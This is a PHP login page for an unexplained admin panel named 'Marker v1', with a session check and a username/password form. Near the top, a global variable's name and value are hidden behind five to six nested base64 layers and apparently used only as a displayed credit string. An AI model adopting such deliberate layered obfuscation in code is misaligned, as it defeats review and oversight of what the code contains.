<?php
session_start();
include('api/api.php');
if (isset($_SESSION['csrftoken'])) {
    if (check_login($_SESSION['csrftoken']) == true) { header('location: panel.php'); }
} else {
    $GLOBALS[base64_decode(base64_decode(base64_decode(base64_decode(base64_decode('VmxaU1QxTXlTa2RpUm14V1lsaG9hRlZXVVhkUFVUMDk=')))))] = base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode('Vm14YVUxUXhUWGxUYTJScFVtMTRWMWxzYUc5aFJsWlZVV3QwVTFKdVFsaFdSM1JMVlVaS2RHVkdWbFpXZWtFeFdWY3hTMVl4WkhWVmJGcFRZWHBXVFZkWGNFdFZNVTVYVm01V1lWSXpRbk5aYkZKeVpWWmFSbFZyT1doTlJFSTFWbGR3VjFReFpFWlRia0phWWxoTmQxcEVSbXRXTVhCSVpFZDRWMkpZYUZwV1JsWnZWakZrY2sxWVJtbFNSVXBXVld0V2RtUXhhM2RhUlhSclVtNUNTVnBGWkhOVWJVWnlWMVJLVjAxWGFIcFZNbmgyWlZaU1dXTkdXbWhpUm5CM1ZsZHdSMVpyTlZkVWJHaFBWbXMxY0ZWcVJtRlRiRnBYWVVaT1dsWnJiRFJXTWpWSFYyMUdjazVWZUZwV1YxSlVWVEJrUzFOV1pIUmlSMmhwVmtkNE1WWXhZM2RrTURWWVZXeGthbEpzV25GVVZ6RlRXVlpTV0dOSVRteGlSM2g0VmtkMGQxUXlSWGxsUlhCWVlUSk5NVmxWV210U01VNTFWR3hXVGsxdWFFVlhWM2hyVTIxV1ZrNVdWbEpoZWtaWlZXeFNWMDB4WkhOWk0yaFhZWHBXZVZsclZsZFZNVnBHVTI1R1ZrMUhVbkZVVkVaUFYwZEtObEpzVmxOTlJuQmFWa2Q0YWsxV1ZYaFRhbHBwVWtWS1dGWnJWbmRVTVZGM1ZtcE9iRlpyY0ZWWk0yOTNVRkU5UFE9PQ=='))))));
    $GLOBALS['sections'] = "<section class='tuoba'>Marker v1 - $Created</section>";
}
?>
<html>
    <head>
        <title>Marker v1</title>
        <meta charset="utf-8">
        <meta name="robots" content="noodp"/>
        <meta property="og:locale" content="ar_AR" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="IE=8" />
        <meta name="theme-color" content="#cccccc" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="Content-Script-Type" content="text/javascript" />
        <link type="text/css" rel="stylesheet" href="style.css">
        <style>
            body {
                border: 0;
                margin: 0;
                padding: 0;
            }
        </style>
        <script src="linked/a5794e9cdf.js"></script>
        <script src="linked/jquert-3.2.1.min.js"></script>
    </head>
    <body>
        <?php echo $sections; ?>
        <section class="login" <?php if (isset($_GET['err'])) { echo 'id="err"'; } ?>>
            <form method="post" action="login.php">
                <section class="input_container">
                    <section id="username" class="icon"><i class="fa fa-user" aria-hidden="true"></i></section>
                    <section class="text"><input type="text" name="username" placeholder="Username..."></section>
                </section>
                <section class="input_container">
                    <section id="password" class="icon"><i class="fa fa-key" aria-hidden="true"></i></section>
                    <section class="text"><input type="password" name="password" placeholder="Password..."></section>
                </section>
                <section class="submit">
                    <input type="submit" name="submit" value="Login">
                </section>
            </form>
        </section>
    </body>
</html>